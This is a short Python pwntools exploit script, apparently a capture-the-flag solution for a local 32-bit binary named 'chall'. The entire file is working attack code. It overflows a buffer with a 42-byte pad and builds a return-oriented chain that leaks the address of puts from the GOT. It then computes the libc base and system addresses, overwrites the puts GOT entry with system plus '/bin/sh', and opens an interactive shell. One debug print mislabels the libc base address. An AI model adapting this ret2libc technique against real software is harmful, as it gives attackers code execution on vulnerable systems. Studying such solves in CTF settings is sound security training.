#!/usr/bin/python3
#-*-coding:utf-8-*-

from pwn import *

target = process("./chall")
# elf = ELF("./chall")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")

# address
puts_plt = 0x08048310
puts_got = 0x0804a010
gets_plt = 0x08048300

pop1ret = 0x80482e9

libc_puts_off = 0x67360
libc_system_off = 0x3cd10

# puts_plt = elf.plt["puts"]
# puts_got = elf.got["puts"]
# gets_plt = elf.plt["gets"]

# pop1ret = ROP(elf).ebx[0]

# libc_puts_off = libc.symbols["puts"]
# libc_system_off = libc.symbols["system"]

# print("[*] puts plt addr : 0x{:x}".format(puts_plt))
# print("[*] puts got addr : 0x{:x}".format(puts_got))
# print("[*] gets plt addr : 0x{:x}".format(gets_plt))
# print("[*] pop 1 ret addr : 0x{:x}".format(pop1ret))
# print("[*] libc system offset : 0x{:x}".format(libc_system_off))
# print("[*] libc puts offset : 0x{:x}".format(libc_puts_off))

# payload 
payload = b"A" * 42
payload += p32(puts_plt)
payload += p32(pop1ret)
payload += p32(puts_got)

payload += p32(gets_plt)
payload += p32(pop1ret)
payload += p32(puts_got)

payload += p32(puts_plt)
payload += b"BBBB"
payload += p32(puts_got + 4) 

_ = target.readline()
target.sendline(payload)
_ = target.readline()

libc_puts_addr = u32(target.readline()[0:4])
print("[*] libc_puts_addr : 0x{:x}\n".format(libc_puts_addr))

libc_base_addr = libc_puts_addr - libc_puts_off
libc_system_addr = libc_base_addr + libc_system_off

print("[*] libc_puts_addr : 0x{:x}\n".format(libc_base_addr))

target.sendline(p32(libc_system_addr) + b"/bin/sh\x00")


target.interactive()
